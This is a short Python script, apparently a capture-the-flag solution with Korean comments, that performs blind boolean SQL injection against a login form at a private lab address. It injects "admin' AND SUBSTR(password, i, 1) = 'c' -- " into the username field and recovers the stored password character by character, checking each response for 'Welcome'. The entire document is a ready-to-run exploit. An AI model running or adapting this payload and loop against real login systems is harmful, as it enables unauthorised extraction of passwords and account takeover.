import requests

url = "http://10.20.12.187:4002"
session = requests.Session()

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.20.12.187:4002",
    "Referer": "http://10.20.12.187:4002/",
}

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
flag = "flag{"  # 이미 알아낸 시작 부분

for i in range(len(flag) + 1, 50):
    found = False
    for c in charset:
        payload_id = f"admin' AND SUBSTR(password, {i}, 1) = '{c}' -- "
        data = {
            "username": payload_id,
            "password": "anything"
        }

        response = session.post(url, headers=headers, data=data)

        if "Welcome" in response.text:
            flag += c
            print(f"[+] 현재까지 추출된 flag: {flag}", end="\r")
            found = True
            break

    if not found:
        print("\n[-] 더 이상 문자를 찾을 수 없습니다.")
        break

print(f"\n[+] 최종 추출된 flag: {flag}")